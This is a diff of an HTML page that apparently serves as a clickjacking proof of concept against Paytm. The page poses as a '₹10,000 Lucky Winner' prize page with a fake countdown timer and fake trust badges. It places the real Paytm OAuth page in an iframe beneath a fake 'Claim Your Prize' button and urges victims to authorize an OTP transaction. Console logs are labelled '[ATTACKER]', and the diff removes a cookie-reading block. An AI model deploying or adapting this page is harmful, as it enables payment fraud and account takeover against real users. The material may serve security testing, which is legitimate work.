@@ -1,49 +1,36 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>🎉 Paytm Lucky Winner - Claim ₹10,000!</title>
     <style>
-        /* ============================
-           RESET & BASE STYLES
-        ============================ */
+        /* ===== RESET & BASE ===== */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
         body {
             font-family: 'Segoe UI', Arial, sans-serif;
-            background: linear-gradient(135deg, #e8f0fe 0%, #d4e4f7 100%);
+            background: linear-gradient(135deg, #e8f0fe, #d4e4f7);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
         }
-        
-        .attacker-container {
+        .container {
             max-width: 850px;
             width: 100%;
-            background: #ffffff;
+            background: #fff;
             border-radius: 28px;
             box-shadow: 0 20px 60px rgba(0, 41, 112, 0.25);
             overflow: hidden;
-            position: relative;
-            animation: floatIn 0.6s ease-out;
         }
-        
-        @keyframes floatIn {
-            from { opacity: 0; transform: translateY(30px) scale(0.97); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
-        }
-        
-        /* ============================
-           HEADER (Paytm Branding)
-        ============================ */
-        .fake-header {
+
+        /* ===== HEADER ===== */
+        .header {
             background: linear-gradient(135deg, #002970, #0047b3);
             padding: 22px 30px;
             display: flex;
@@ -51,92 +38,60 @@
             align-items: center;
             border-bottom: 4px solid #00baf2;
         }
-        
-        .fake-header .logo {
+        .header .logo {
             display: flex;
             align-items: center;
             gap: 12px;
-        }
-        
-        .fake-header .logo .icon {
-            font-size: 32px;
-        }
-        
-        .fake-header .logo .brand {
-            color: #ffffff;
+            color: #fff;
             font-size: 24px;
             font-weight: 700;
-            letter-spacing: 1px;
         }
-        
-        .fake-header .logo .brand span {
+        .header .logo span {
             color: #00baf2;
         }
-        
-        .fake-header .badge {
+        .header .badge {
             background: #00baf2;
             color: #002970;
             padding: 6px 16px;
             border-radius: 50px;
             font-size: 13px;
             font-weight: 700;
-            animation: pulseBadge 2s infinite;
+            animation: pulse 2s infinite;
         }
-        
-        @keyframes pulseBadge {
+        @keyframes pulse {
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.05); }
         }
-        
-        /* ============================
-           HERO SECTION
-        ============================ */
+
+        /* ===== HERO ===== */
         .hero {
             text-align: center;
             padding: 30px 30px 15px;
-            background: linear-gradient(180deg, #f0f7ff 0%, #ffffff 100%);
+            background: linear-gradient(180deg, #f0f7ff, #fff);
         }
-        
-        .hero .emoji-big {
+        .hero .emoji {
             font-size: 64px;
-            display: block;
-            margin-bottom: 10px;
         }
-        
         .hero h1 {
             font-size: 38px;
             color: #002970;
-            font-weight: 800;
         }
-        
         .hero h1 .highlight {
             color: #00baf2;
         }
-        
-        .hero .sub-title {
-            font-size: 18px;
-            color: #555;
-            margin-top: 6px;
-        }
-        
-        .hero .prize-amount {
+        .hero .prize {
             font-size: 52px;
             font-weight: 900;
             color: #00baf2;
-            margin: 8px 0;
-            text-shadow: 0 2px 10px rgba(0, 186, 242, 0.2);
         }
-        
-        .hero .prize-amount small {
+        .hero .prize small {
             font-size: 20px;
             color: #888;
             font-weight: 400;
         }
-        
-        /* ============================
-           TIMER (Urgency)
-        ============================ */
-        .timer-section {
+
+        /* ===== TIMER ===== */
+        .timer {
             background: #f0f4fb;
             padding: 16px 20px;
             margin: 0 30px 15px;
@@ -144,65 +99,47 @@
             display: flex;
             justify-content: center;
             gap: 30px;
-            flex-wrap: wrap;
             border: 1px solid #dce6f0;
         }
-        
         .timer-item {
             text-align: center;
         }
-        
         .timer-item .num {
             font-size: 32px;
             font-weight: 800;
             color: #002970;
-            display: block;
-            font-variant-numeric: tabular-nums;
         }
-        
         .timer-item .lbl {
             font-size: 11px;
             color: #888;
             text-transform: uppercase;
-            letter-spacing: 1px;
         }
-        
-        /* ============================
-           INFO BOX
-        ============================ */
-        .info-box {
+
+        /* ===== INFO ===== */
+        .info {
             background: #f8fbff;
             border: 1px solid #e0eaf5;
             border-radius: 14px;
             padding: 18px 22px;
             margin: 0 30px 15px;
         }
-        
-        .info-box h3 {
+        .info h3 {
             color: #002970;
-            font-size: 16px;
-            margin-bottom: 8px;
         }
-        
-        .info-box ul {
+        .info ul {
             list-style: none;
             padding: 0;
         }
-        
-        .info-box ul li {
+        .info ul li {
             padding: 4px 0;
             color: #444;
-            font-size: 14px;
         }
-        
-        .info-box ul li::before {
+        .info ul li::before {
             content: "✅ ";
             color: #00baf2;
         }
-        
-        /* ============================
-           ⚡ CLICKJACKING IFRAME (THE TRAP)
-        ============================ */
+
+        /* ===== CLICKJACKING WRAPPER ===== */
         .clickjack-wrapper {
             position: relative;
             margin: 0 30px 20px;
@@ -210,9 +147,8 @@
             overflow: hidden;
             border: 3px solid #00baf2;
             box-shadow: 0 8px 30px rgba(0, 186, 242, 0.25);
-            background: #ffffff;
+            background: #fff;
         }
-        
         .clickjack-wrapper iframe {
             display: block;
             width: 100%;
@@ -220,11 +156,9 @@
             border: none;
             pointer-events: none;
         }
-        
-        /* ============================
-           🔥 FAKE BUTTON - USER CLICKS THIS!
-        ============================ */
-        .overlay-container {
+
+        /* ===== FAKE BUTTON (USER CLICKS THIS) ===== */
+        .overlay {
             position: absolute;
             top: 0;
             left: 0;
@@ -235,11 +169,10 @@
             align-items: center;
             pointer-events: none;
         }
-        
-        .fake-claim-btn {
+        .fake-btn {
             pointer-events: auto;
             background: linear-gradient(135deg, #00baf2, #0088cc);
-            color: #ffffff;
+            color: #fff;
             border: none;
             padding: 22px 55px;
             font-size: 30px;
@@ -247,62 +180,41 @@
             border-radius: 80px;
             cursor: pointer;
             box-shadow: 0 12px 40px rgba(0, 186, 242, 0.55);
-            position: relative;
             z-index: 20;
-            transition: transform 0.25s ease, box-shadow 0.25s ease;
             animation: btnPulse 2s infinite;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.15);
         }
-        
-        .fake-claim-btn:hover {
+        .fake-btn:hover {
             transform: scale(1.06);
-            box-shadow: 0 16px 50px rgba(0, 186, 242, 0.7);
         }
-        
         @keyframes btnPulse {
             0%, 100% { box-shadow: 0 12px 40px rgba(0, 186, 242, 0.55); }
             50% { box-shadow: 0 12px 60px rgba(0, 186, 242, 0.85); }
         }
-        
-        .fake-claim-btn .sub-text {
+        .fake-btn .sub {
             display: block;
             font-size: 14px;
             font-weight: 400;
-            opacity: 0.92;
-            margin-top: 4px;
         }
-        
-        .fake-claim-btn .emoji-top {
-            display: block;
-            font-size: 36px;
-            margin-bottom: 2px;
-        }
-        
-        /* ============================
-           FOOTER
-        ============================ */
-        .footer-section {
+
+        /* ===== FOOTER ===== */
+        .footer {
             padding: 18px 30px 25px;
             text-align: center;
             border-top: 1px solid #eef3f8;
         }
-        
-        .footer-section .warning-msg {
+        .footer .warning {
             background: #fff3cd;
             padding: 12px 18px;
             border-radius: 12px;
             color: #856404;
-            font-size: 14px;
             font-weight: 600;
             margin-bottom: 12px;
             border: 1px solid #ffc107;
         }
-        
-        .footer-section .warning-msg span {
+        .footer .warning span {
             color: #d63031;
         }
-        
-        .footer-section .trust-badges {
+        .footer .trust {
             display: flex;
             justify-content: center;
             gap: 25px;
@@ -310,115 +222,87 @@
             font-size: 13px;
             color: #777;
         }
-        
-        .footer-section .trust-badges span {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        
-        /* ============================
-           RESPONSIVE
-        ============================ */
+
+        /* ===== RESPONSIVE ===== */
         @media (max-width: 650px) {
             .hero h1 { font-size: 26px; }
-            .hero .prize-amount { font-size: 36px; }
-            .fake-claim-btn { padding: 16px 30px; font-size: 22px; }
+            .hero .prize { font-size: 36px; }
+            .fake-btn { padding: 16px 30px; font-size: 22px; }
             .clickjack-wrapper iframe { height: 380px; }
-            .fake-header .logo .brand { font-size: 18px; }
+            .header .logo { font-size: 18px; }
             .timer-item .num { font-size: 24px; }
-            .fake-header { padding: 14px 18px; }
-            .timer-section { margin: 0 15px 12px; gap: 15px; }
-            .info-box { margin: 0 15px 12px; }
+            .timer { margin: 0 15px 12px; gap: 15px; }
+            .info { margin: 0 15px 12px; }
             .clickjack-wrapper { margin: 0 15px 16px; }
         }
-        
         @media (max-width: 400px) {
             .clickjack-wrapper iframe { height: 300px; }
-            .fake-claim-btn { padding: 12px 20px; font-size: 18px; }
-            .fake-claim-btn .sub-text { font-size: 11px; }
-            .hero h1 { font-size: 20px; }
+            .fake-btn { padding: 12px 20px; font-size: 18px; }
+            .fake-btn .sub { font-size: 11px; }
         }
     </style>
 </head>
 <body>
 
-<div class="attacker-container">
+<div class="container">
 
     <!-- ===== HEADER ===== -->
-    <div class="fake-header">
-        <div class="logo">
-            <span class="icon">📱</span>
-            <span class="brand">Paytm <span>Winner</span></span>
-        </div>
+    <div class="header">
+        <div class="logo">📱 Paytm <span>Winner</span></div>
         <span class="badge">🎁 LIVE NOW</span>
     </div>
 
     <!-- ===== HERO ===== -->
     <div class="hero">
-        <span class="emoji-big">🎉</span>
+        <span class="emoji">🎉</span>
         <h1>You're Our <span class="highlight">Lucky Winner</span>!</h1>
-        <p class="sub-title">You have been selected randomly from <strong>2.5 Million</strong> users</p>
-        <div class="prize-amount">
-            ₹10,000 <small>Cash Prize</small>
-        </div>
+        <p style="color:#555;">You have been selected from <strong>2.5 Million</strong> users</p>
+        <div class="prize">₹10,000 <small>Cash Prize</small></div>
     </div>
 
     <!-- ===== TIMER ===== -->
-    <div class="timer-section">
-        <div class="timer-item">
-            <span class="num" id="hrs">02</span>
-            <span class="lbl">Hours</span>
-        </div>
-        <div class="timer-item">
-            <span class="num" id="mins">45</span>
-            <span class="lbl">Minutes</span>
-        </div>
-        <div class="timer-item">
-            <span class="num" id="secs">32</span>
-            <span class="lbl">Seconds</span>
-        </div>
+    <div class="timer">
+        <div class="timer-item"><span class="num" id="hrs">02</span><span class="lbl">Hours</span></div>
+        <div class="timer-item"><span class="num" id="mins">45</span><span class="lbl">Minutes</span></div>
+        <div class="timer-item"><span class="num" id="secs">32</span><span class="lbl">Seconds</span></div>
     </div>
 
-    <!-- ===== INFO BOX ===== -->
-    <div class="info-box">
-        <h3>📋 How to Claim Your Prize:</h3>
+    <!-- ===== INFO ===== -->
+    <div class="info">
+        <h3>📋 How to Claim:</h3>
         <ul>
             <li>Click the <strong>blue "Claim Your Prize"</strong> button below</li>
             <li>You'll be redirected to <strong>Paytm</strong> for verification</li>
             <li>Authorize the transaction (OTP required)</li>
-            <li><strong>₹10,000</strong> will be credited instantly to your Wallet!</li>
+            <li><strong>₹10,000</strong> credited instantly!</li>
         </ul>
     </div>
 
-    <!-- ============================================================
+    <!-- ==========================================================
          ⚡ CLICKJACKING TRAP
-         ============================================================ -->
+         ========================================================== -->
     <div class="clickjack-wrapper">
-        <!-- ===== REAL PAYTM PAGE (HIDDEN) ===== -->
+
+        <!-- REAL PAYTM PAGE (HIDDEN) -->
         <iframe 
             id="paytmIframe"
             src="https://accounts.paytm.com/oauth-js-sdk/index.html"
-            sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
-            loading="eager">
+            sandbox="allow-scripts allow-same-origin allow-forms allow-popups">
         </iframe>
 
-        <!-- ===== FAKE BUTTON ON TOP ===== -->
-        <div class="overlay-container">
-            <button class="fake-claim-btn" id="claimBtn">
-                <span class="emoji-top">🎁</span>
-                Claim Your Prize!
-                <span class="sub-text">✓ Instant ₹10,000 Credit</span>
+        <!-- FAKE BUTTON (USER CLICKS THIS) -->
+        <div class="overlay">
+            <button class="fake-btn" id="claimBtn">
+                🎁 Claim Your Prize!
+                <span class="sub">✓ Instant ₹10,000 Credit</span>
             </button>
         </div>
     </div>
 
     <!-- ===== FOOTER ===== -->
-    <div class="footer-section">
-        <div class="warning-msg">
-            ⚠️ <span>Limited slots!</span> Only first 500 users will receive the prize.
-        </div>
-        <div class="trust-badges">
+    <div class="footer">
+        <div class="warning">⚠️ <span>Limited slots!</span> Only first 500 users will receive the prize.</div>
+        <div class="trust">
             <span>🔒 256-bit SSL Secure</span>
             <span>⭐ 4.8/5 Trust Score</span>
             <span>⏱️ 2,847 claimed today</span>
@@ -427,67 +311,29 @@
 </div>
 
 <script>
-    // ============================
-    // FAKE COUNTDOWN TIMER
-    // ============================
-    let totalSeconds = 9320;
+    // ===== FAKE TIMER =====
+    let total = 9320;
+    setInterval(() => {
+        if (total > 0) total--;
+        document.getElementById('hrs').textContent = String(Math.floor(total/3600)).padStart(2,'0');
+        document.getElementById('mins').textContent = String(Math.floor((total%3600)/60)).padStart(2,'0');
+        document.getElementById('secs').textContent = String(total%60).padStart(2,'0');
+    }, 1000);
 
-    function updateTimer() {
-        const hrs = Math.floor(totalSeconds / 3600);
-        const mins = Math.floor((totalSeconds % 3600) / 60);
-        const secs = totalSeconds % 60;
-        
-        document.getElementById('hrs').textContent = String(hrs).padStart(2, '0');
-        document.getElementById('mins').textContent = String(mins).padStart(2, '0');
-        document.getElementById('secs').textContent = String(secs).padStart(2, '0');
-        
-        if (totalSeconds > 0) totalSeconds--;
-    }
-    setInterval(updateTimer, 1000);
-
-    // ============================
-    // FAKE BUTTON CLICK - ATTACKER TRACKING
-    // ============================
+    // ===== FAKE BUTTON CLICK =====
     document.getElementById('claimBtn').addEventListener('click', function(e) {
         e.preventDefault();
-        
         console.log('🔥 [ATTACKER] Victim clicked the fake button!');
-        console.log('🔥 [ATTACKER] Paytm OAuth page is loaded in iframe');
-        
         alert('🎉 Redirecting to Paytm... Please authorize to claim your ₹10,000 prize!');
-        
-        // Attacker tracking
-        try {
-            const iframe = document.getElementById('paytmIframe');
-            console.log('🔍 Iframe src:', iframe.src);
-        } catch(err) {
-            console.log('⚠️ Cannot access iframe content (CORS)');
-        }
     });
 
-    // ============================
-    // CHECK IF IFRAME LOADED
-    // ============================
+    // ===== CHECK IFRAME LOADED =====
     document.getElementById('paytmIframe').addEventListener('load', function() {
-        console.log('✅ [ATTACKER] Paytm page LOADED in iframe!');
-        console.log('✅ [ATTACKER] Clickjacking is WORKING!');
+        console.log('✅ [ATTACKER] Paytm page LOADED in iframe! Clickjacking is WORKING!');
     });
-
     document.getElementById('paytmIframe').addEventListener('error', function() {
         console.log('❌ [ATTACKER] Paytm page BLOCKED from loading');
     });
-
-    // ============================
-    // STEAL COOKIES (If possible)
-    // ============================
-    try {
-        const cookies = document.cookie;
-        if (cookies) {
-            console.log('🍪 [ATTACKER] Cookies found:', cookies);
-        }
-    } catch(e) {
-        console.log('⚠️ Cannot access cookies');
-    }
 </script>
 
 </body>
